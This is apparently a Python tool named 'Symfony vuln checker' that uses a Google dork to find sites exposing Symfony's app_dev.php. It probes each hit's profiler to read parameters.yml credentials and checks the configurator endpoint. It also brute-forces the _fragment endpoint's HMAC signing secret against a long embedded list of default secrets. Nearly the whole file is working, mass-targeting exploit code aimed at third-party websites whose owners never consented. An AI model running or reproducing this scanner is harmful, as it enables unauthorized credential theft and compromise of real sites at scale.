try:
	import requests
	import re
	from bs4 import BeautifulSoup
	import argparse
	import hashlib
	import hmac
	import base64
	import urllib.parse as up
	import urllib3
	import itertools
	import sys
	import os
	import pyfiglet
	import colorama
	from colorama import Fore, Style
except ImportError as e:
    print("The error occured: %s"%e)
    print("Try this: pip3 install -r ./requirement.txt")
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama.init()

parser=argparse.ArgumentParser(description="This tool allows you to scan the configuration of Symfony's developer mode using Google Dorks")
parser._action_groups.pop()
required = parser.add_argument_group('required arguments')
optional = parser.add_argument_group('optional arguments')
required.add_argument("--cookie", dest='cookie', help="You must specify your Google Chrome cookie", type=str, required=True)
optional.add_argument("--nburl", dest='nburl', help="Specifies the total number of urls to scan", type=str)
optional.add_argument("--starturl", dest='starturl', help="Specifies which url to start from on Google", type=str)
optional.add_argument("--skip", dest='skip', help="Do not use the token bruteforce method : --skip true", type=bool, default=False)
args=parser.parse_args()


headers_Get = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'accept-encoding' : 'gzip, deflate, br',
		'accept-language' : 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
		'cookie': args.cookie,
		'sec-fetch-dest' : 'document',
		'sec-fetch-mode' : 'navigate',
		'sec-fetch-site' : 'none',
		'sec-fetch-user' : '?1',
	    'upgrade-insecure-requests' : '1',
        'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
    }

USUAL_SECRETS = [
    'ThisTokenIsNotSoSecretChangeIt',
    'ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt',
    'ff6dc61a329dc96652bb092ec58981f7',
    '<app-secret-id>',
    '54de6f999a511111e232d9a5565782f1',
    'Wh4t3v3r',
    'cc86c7ca937636d5ddf1b754beb22a10',
    '00811410cc97286401bd64101121de999b',
    '29f90564f9e472955211be8c5e05ee0a',
    '1313eb8ff3f07370fe1501a2fe57a7c7',
    'c78ebf740b9db52319c2c0a201923d62',
    'test',
    '24e17c47430bd2044a61c131c1cf6990',
    'EDITME',
    '4fd436666d9d29dd0773348c9d4be05c',
    'd120bc9442daf50769276abd769df8e9',
    'HeyIAmSecret',
    '!ChangeMe!',
    '${APP_SECRET}',
    '17fe130b189469cd85de07822d362f56',
    '16b10f9d2e7885152d41ea6175886563a',
    's$cretf0rt3st',
    '44705a2f4fc85d70df5403ac8c7649fd',
    'd6f9c4f8997e182557e0602aa11c68ca',
    '%env(resolve:APP_SECRET)%',
    '964f0359a5e14dd8395fe334867e9709',
    '31ab70e5aea4699ba61deddc8438d2f1',
    '%secret%',
    '9fc8286ff23942648814f85ee18381bc',
    'foobar123',
    'ClickToGenerate',
    'secretthings',
    'thisvariableissuddenlyneededhere',
    '9258a6c0e5c19d0d58a8c48bbc757491',
    '2eb810c79fba0dd5c029a2fa53bfdb51',
    'secret',
    '81d300585b3dfdf6a3161e48d970e2baea252e42',
    'thesecret',
    'xxxxxxxxxx',
    'b92c43d084fa449351e0524bf60bf972',
    '24f508c1071242299426ae6af85d5309',
    '2a0f335581bd72b6077840e29d73ba36',
    'klasjdfklajsdfkajsédfkjiewoji',
    '6eb99720adab08a18624be3388d9f850',
    'cf4d2c8e2757307d2c679b176e6d6070',
    'pasteYourSecretKeyHere',
    'asecretkey',
    'This is a secret, change me',
    '300d7b538e92e90197c3b5b2d2f8fa3f',
    '966536d311ddae0996d1ffd21efa1027',
    '307fbdc5fd538f6d733e8a2f773b6a39',
    '5ea3114a349591bd131296e00f21c20a',
    '123456789',
    '13bb5de558715e730e972ab52626ab6a',
    '4d1f86e8d726abe792f9b65e1b60634c',
    'adc3f69b4b8262565f7abb9513de7f36',
    '5ub5upfxih0k8g44w00ogwc4swog4088o8444sssos8k888o8g',
    'ThisIsNotReallySecretButOK',
    'f78d2a48cbd00d92acf418a47a0a5c3e',
    '123',
    '8b3fdfaddad056c4ca759ffe81156eafb10f30fc',
    '43db4c69b1c581489f70c4512191e484',
    'Xjwr91jr~j3gV-d6w@2&oI)wFc5ZiL',
    '&lt;app-secret-id>',
    '8c6e5404e4f1e5934b5b2da46cadaef0',
    '1083dc7bfd20cc8c2bd10148631513ecf7',
    'd3e2fa9715287ba25b2d0fd41685ac031970f555',
    'super_secret',
    '6b566e17cf0965eb4db2fef5f41bae18',
    '859bdea01e182789f006e295b33275af',
    'bdb22a4d4f0ed0e35a97fed13f18646f',
    '8501eeca7890b89042ccae7318a44fb1',
    'dbd3856a5c7b24c92263323e797ec91c',
    'xxxxxxxxxxxxxxxxx',
    'bca0540d761fb1055893195ad87acf07',
    '123123',
    'IAmNotSecret',
    'WhateverYouLikeTo',
    'bf05fa89ece928e6d1ecec0c38a008ee',
    'xxxxxxxaxaxaxa',
    '97829395eda62d81f37980176ded371a',
    'YOUR_APP_SECRET',
    '879a6adeceeccbdc835a19f7e3aad7e8',
    'some_new_secret_123',
    'f96c2d666ace1278ec4c9e2304381bc3',
    '7d41a4acde33432b1d51eae15a301550',
    '236cd9304bb88b11e2bb4d56108dffa8',
    '8cfa2bd0b50b7db00e9c186be68f7ce7465123d3',
    'dd4aaa68cebc5f632a489bfa522a0adc',
    's3kr3t',
    '3d05afda019ed4e3faaf936e3ce393ba',
    'a3aeede1199a907af36438508bb59cb8',
    '!NotSoSecretChangeMe!',
    'gPguz9ImBhOIRCntIJPwbqbFJTZjqSHaq8AkTk2pdoHYw35rYRs9VHX0',
    '367d9a07f619290b5cae0ab961e4ab94',
    'changeMeInDotEnvDotLocal',
    '{your-app-secret}',
    '32bb1968190362d214325d23756ffd65',
    '4f113cda46d1808807ee7e263da59a47',
    '67d829bf61dc5f87a73fd814e2c9f629',
    'cbe614ba25712be13e5ec4b651f61b06',
    '8d2a5c935d8ef1c0e2b751147382bc75',
    'thefamoussecretkeylol',
    '%env(APP_SECRET)%',
    'fe2ed475a06588e021724adc11f52849',
    'b2baa331595d5773b63d2575d568be73',
    '$ecretf0rt3st',
    'SuperSecretToken'
]


def fix_url(url):
	"""
	This function give a valid url without parameters
	"""
	if(re.search(".*/$",url)):
		pass
	else:
		newList = url.split('/')
		delVal = str(newList[len(newList)-1])
		url = url.replace(delVal,'')
	return url

def fix_index_url(url,content):
	"""
	This function give a valid url (url maybe changed)
	"""
	if(re.search(".*Index of.*",content)):
		path = content.split('Index of ')[1].split('</title>')[0]
		if path == '/':
			url = url.split('://')[0]+'://'+url.split('/')[2]+path
		else:
			url = url.split('://')[0]+'://'+url.split('/')[2]+path+'/'
	return url



def compute_hmac(secret, data, algo):
    algo = getattr(hashlib, algo)
    token = hmac.new(secret.encode(), data.encode(), algo).digest()
    return base64.b64encode(token)

def build_url_with_hash(url, internal_url, secret, algo, **infos):
    infos = up.quote_plus(up.urlencode(infos))
    query_string = f'?_path={infos}'

    to_sign = f'{internal_url}{query_string}'
    _hash = compute_hmac(secret, to_sign, algo)
    # On some Symfony versions, the URL-encoded versions of the hashes are
    # compared, so we need the URL-encoding to match PHP's.
    # Python does not replace "/", but PHP does.
    quoted_hash = up.quote(_hash).replace('/', '%2F')

    return f'{url}{query_string}&_hash={quoted_hash}'

def generate_mutations(url, internal_url, secret, algo):
    """Generates every potential (internal_url, secret) pair. Those pairs will
    be tried one by one until something works.
    """
    if internal_url:
        internal_urls = [internal_url]
    elif url.startswith('https://'):
        internal_urls = [
            url,
            url.replace('https://', 'http://')
        ]
    else:
        internal_urls = [
            url,
            url.replace('http://', 'https://')
        ]

    secrets = secret and [secret] or USUAL_SECRETS
    algos = ['sha256', 'sha1']

    return list(itertools.product(algos, secrets, internal_urls))

def check_args(args):
	res = True
	try:
		int(args)
	except(TypeError, ValueError):
		res = False
	return res


os.system('cls' if os.name == 'nt' else 'clear')
HEADER=pyfiglet.figlet_format("Symfony vuln checker", font = "slant"  ) 
VERSION='version:1'
WRITER='https://github.com/bizibabe/symfony-check-vuln-google-dorks\n'
BY='By Google Dorks\n'
print(Fore.YELLOW+HEADER)
print(Fore.MAGENTA+VERSION.center(70))
print(Fore.MAGENTA+WRITER.center(70))
print(Fore.MAGENTA+BY.center(70))
print(Style.RESET_ALL)

totalUrl = 0
nbUrl = '10'
nbMut = 0
startUrl = '0'
countVuln = 0
dork_payload = 'intitle:"index of" "app_dev.php"'

if(args.nburl):
	if(not check_args(args.nburl)):
		print(Fore.YELLOW+'[!] Parameter nburl must be int')
		sys.exit(1)
	else:
		nbUrl = args.nburl
if(args.starturl):
	if(not check_args(args.starturl)):
		print(Fore.YELLOW+'[!] Parameter starturl must be int')
		sys.exit(1)
	else:
		startUrl = args.starturl

try:
	print('--------------------------------------------------------------------------------------------------------')
	url = 'https://www.google.com/search?start={}&num={}&q={}'.format(startUrl,nbUrl,dork_payload)
	r = requests.get(url, headers=headers_Get)
	soup = BeautifulSoup(r.content, 'lxml')
	tags = soup.find_all('a')
	for tag in tags:
		url = tag.get('href')
		if(url == "#" or url == None or re.search(".*google..*", url) or re.search("^/search?.*", url) or not re.search("^http.*", url)):
			pass
		else:
			url = fix_url(url)
			try:
				check0 = requests.get(url, verify=False, timeout=5)
				url = fix_index_url(url,check0.text)
				check1 = requests.get(url+'app_dev.php', verify=False, timeout=5)
				check2 = requests.get(url+'app_dev.php/_profiler/open?file=app/config/parameters.yml', verify=False, timeout=5)
				check3 = requests.get(url+'app_dev.php/_configurator/final', verify=False, timeout=5)
				check4 = requests.get(url+'app_dev.php/_fragment', verify=False, timeout=5)
				if(check1.status_code != 403):
					if(check2.url == url+'app_dev.php/_profiler/open?file=app/config/parameters.yml' and check2.status_code == 200 and not re.search(".*Token not found.*", str(check2.content))):
						if(check4.status_code == 403):
							print(Fore.GREEN+'[+] {}app_dev.php/_profiler/open?file=app/config/parameters.yml is vulnerable [Token and creds found] [_fragment found]'.format(url))
							countVuln = countVuln + 1
							totalUrl = totalUrl + 1
						else:
							print(Fore.YELLOW+'[!] {}app_dev.php/_profiler/open?file=app/config/parameters.yml maybe vulnerable'.format(url)+Fore.GREEN+' [Token and creds found]'+Fore.RED+' [_fragment not found]')
							totalUrl = totalUrl + 1
					elif(check3.url == url+'app_dev.php/_configurator/final' and check3.status_code == 200 and not re.search(".*Token not found.*", str(check3.content))):
						if(check4.status_code == 403):
							print(Fore.GREEN+'[+] {}app_dev.php/_configurator/final is vulnerable [Token and creds found] [_fragment found]'.format(url))
							countVuln = countVuln + 1
							totalUrl = totalUrl + 1
						else:
							print(Fore.YELLOW+'[!] {}app_dev.php/_configurator/final maybe vulnerable'.format(url)+Fore.GREEN+' [Token and creds found]'+Fore.RED+' [_fragment not found]')
							totalUrl = totalUrl + 1
					elif(check4.status_code == 403):
						if(args.skip != True):
							urlFragment = url+'app_dev.php/_fragment'
							mutations = generate_mutations(urlFragment, urlFragment, "", "")
							totalMutation = len(mutations)
							for algo, secret, internal_url in mutations:
								nbMut = nbMut + 1
								print(Fore.BLUE+'[?] {} Trying Token {}/{} ...\r'.format(internal_url,nbMut,totalMutation),end="")
								urlToken = build_url_with_hash(urlFragment, internal_url, secret, algo)
								response = requests.get(urlToken)
								code = response.status_code
								if code != 403:
									print(Fore.GREEN+'[+] {} is vulnerable [Token found : {}]'.format(internal_url,secret)+Fore.GREEN+' [_fragment found]')
									countVuln = countVuln + 1
									totalUrl = totalUrl + 1
									break
								else:
									pass
							else:
								print(Fore.YELLOW+'[!] {} maybe vulnerable [Token or internal url not found]'.format(internal_url)+Fore.GREEN+' [_fragment found]')
								nbMut = 0
								totalUrl = totalUrl + 1

						else:
							print(Fore.YELLOW+'[!] {} maybe vulnerable [bruteforce skiped]'.format(url))
							totalUrl = totalUrl + 1
					else:
						print(Fore.RED+'[-] {} is not vulnerable [Something is broken or no method found]'.format(url))
						totalUrl = totalUrl + 1
				else:
					print(Fore.RED+'[-] {} is not vulnerable [app_dev.php is not authorised or non-existent]'.format(url))
					totalUrl = totalUrl + 1
				print(Style.RESET_ALL+'--------------------------------------------------------------------------------------------------------')
			except requests.ConnectionError:
				print(Fore.RED+'[-] {} is not vulnerable [Connection refused by the server]'.format(url))
				print(Style.RESET_ALL+'--------------------------------------------------------------------------------------------------------')
				totalUrl = totalUrl + 1
				continue
			except KeyboardInterrupt:
				break
			except requests.exceptions.RequestException:
				print(Fore.YELLOW+'[!] {} maybe vulnerable [The server did not send any data in the allotted amount of time]'.format(url))
				print(Style.RESET_ALL+'--------------------------------------------------------------------------------------------------------')
				totalUrl = totalUrl + 1
				continue
except KeyboardInterrupt:
	sys.exit(0)
	
print(Fore.BLUE+"\n[!] {}/{} websites are vulnerable".format(countVuln,totalUrl))
